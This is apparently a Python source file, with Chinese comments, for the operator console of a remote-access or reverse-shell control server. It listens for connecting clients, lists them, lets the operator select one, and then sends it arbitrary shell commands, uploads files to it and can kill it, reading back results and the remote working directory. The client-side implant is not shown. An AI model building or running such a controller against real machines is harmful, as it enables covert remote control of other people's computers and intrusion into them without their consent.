import os
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))

import threading

from core.server import Server
from util.common_util import parse
from config.server import SOCKET_ADDR


# 服务端接受连接后的回调函数
def handler(conn, addr):
    server.accept(conn, addr)


# 接受命令输入
def accept_commands():
    while True:
        try:
            command = input('flc> ')
            if not command:
                continue
            elif command in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            elif command == 'list':
                server.test_connections()
                list_connections()
            elif 'select' in command:
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[int(command.replace('select', ''))]
                except (ValueError, IndexError):
                    print('[-] Not a valid selection')
                if connection is not None:
                    open_connection(connection)
            else:
                print('[-] Command not recognized')
        except KeyboardInterrupt:
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print('[-] Error: {}'.format(e))


# 查看已连接客户端列表
def list_connections():
    for i, connection in enumerate(server.connections):
        print('{}, {}:{} {}'.format(i, connection.address[0], connection.address[1], connection.info))


# 给客户端发送命令
def open_connection(connection):
    print('[+] Connected to {}'.format(connection.address))
    connection.send_command('null', 'null')
    cwd = connection.recv_result()[1]
    while True:
        try:
            command = input(cwd + '> ')
            if not command:
                continue
            if command in ['quit', 'exit']:
                break
            if command == 'kill':
                connection.send_command(command)
                break
            name, arg = parse(command)
            if name == 'upload':
                if os.path.isfile(arg):
                    connection.send_file(arg)
                else:
                    print('[-] File does not exist')
                    continue
            else:
                connection.send_command(command)
            status, result = connection.recv_result()
            print(result)
            cwd = connection.recv_result()[1]
        except ConnectionResetError:
            print('[-] Connection closed')
            break


if __name__ == '__main__':
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, args=(handler,), daemon=True).start()
    accept_commands()
